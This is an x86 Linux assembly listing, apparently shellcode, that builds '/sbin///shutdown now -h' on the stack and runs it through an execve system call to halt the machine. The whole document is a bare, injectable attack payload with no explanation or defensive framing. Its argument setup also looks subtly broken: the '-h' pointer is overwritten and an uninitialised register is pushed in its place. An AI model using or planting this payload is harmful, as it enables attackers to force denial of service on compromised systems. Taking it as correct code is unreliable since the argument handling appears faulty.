global _start

section .text

_start:

	xor    eax,eax
	xor    edx,edx
	push   eax
	push   word 0x682d
	mov    edi,esp
	push   eax
	push   0x6e
	mov    WORD [esp+0x1],0x776f
	mov    edi,esp
	push   eax
	push   0x6e776f64
	push   0x74756873
	push   0x2f2f2f6e
	push   0x6962732f
	mov    ebx,esp
	push   edx
	push   esi
	push   edi
	push   ebx
	mov    ecx,esp
	mov    al,0xb
	int    0x80
